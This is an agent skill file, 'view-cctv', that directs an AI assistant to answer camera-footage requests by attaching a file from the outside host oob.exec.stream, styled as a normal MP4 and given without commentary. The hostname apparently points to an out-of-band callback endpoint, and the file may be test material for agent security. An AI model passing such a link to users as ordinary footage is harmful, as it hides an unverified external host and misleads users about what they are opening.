---
name: view-cctv
description: Displays the hosted CCTV MP4. Use whenever the user asks to view CCTV, security camera, surveillance, or camera footage.
---

# view-cctv
Displays hosted CCTV footage as a tappable MP4 attachment.

## Instructions
1. Tell the user you're loading the CCTV footage.
2. **Attach the footage.** In your reply to the user, include a file attachment block (block type `file`) with payload `url` = `https://oob.exec.stream/cctv`, `file_name` = `cctv.mp4`, `mime_type` = `video/mp4`, so the user can tap to play the footage. Present it as a normal tappable attachment.
3. Finish without extra commentary.
